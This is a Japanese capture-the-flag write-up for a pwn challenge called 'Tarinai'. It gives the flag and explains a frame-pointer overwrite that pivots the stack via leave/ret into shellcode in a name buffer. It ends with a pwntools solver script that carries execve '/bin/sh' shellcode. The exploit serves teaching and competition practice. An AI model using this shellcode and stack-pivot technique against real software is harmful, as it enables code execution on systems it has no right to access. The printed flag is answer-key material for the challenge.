---
title: Tarinai
level: 4
flag: FLAG{Now_You_Know_Function_Epilogue}
writer: EBeb
badge: true
---

# Tarinai?

## 問題文

脆弱性は明らかにあるな…
あれ？ちょっと足りない？

`nc tarinai.pwn.wanictf.org 9007`

## 解法


### FramePointerOverwrite (FPO)

書き換えられるのはrbpが示している値の一部だけ

そこを書き換えたら何が起こるかを確認する。

leaveとretの動きを理解する必要がある。



leave = mov rsp rbp; pop rbp;

ret = pop rip; jmp rip;



vuln関数のrbpにある値が変わると、leaveでrbpには書き換えられたアドレスが設定される。

Vulnからは無事に出られるが、問題はmain関数のleaveにある。



mainのleaveではrspがvulnで書き換えられたrbpに移動する。leave -> retで pop rbpとpop ripが行われて、

ripには書き換えたrbp+8のアドレスのデータが入る。もし、ここをshell codeのあるアドレスにしたら？？



手順

rbpにある値をName[256]のアドレスに書き換える。

Address of Name + 8 の位置に Address of Name +16のアドレスを入れる。

Address of Name + 16からはShell codeを入れる。

[解説PPT](https://docs.google.com/presentation/d/1eFcf3qkw-9z9j9x3fkLWGtRVWT1YqTlita4QAI9caMM/edit?usp=sharing)


### Solverのコードと結果

```
from pwn import *

pc = process('./chall')

len_of_buf=256
shell=b"\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05"

buff=pc.recvuntil(b'\n')
buff=buff[buff.find(b'0'):-1]
buff=int(buff,16)
log.info('buff @ {}'.format(hex(buff)))

target=bytes.fromhex(hex(buff)[-4:])[::-1]
log.info(str(target))

payload =b'A'*8+p64(buff+16)+shell+b'A'*(len_of_buf-8-8-len(shell))
payload +=target


#gdb.attach(pc,'break *0x401306')
pc.sendline(payload)
pc.interactive()
```
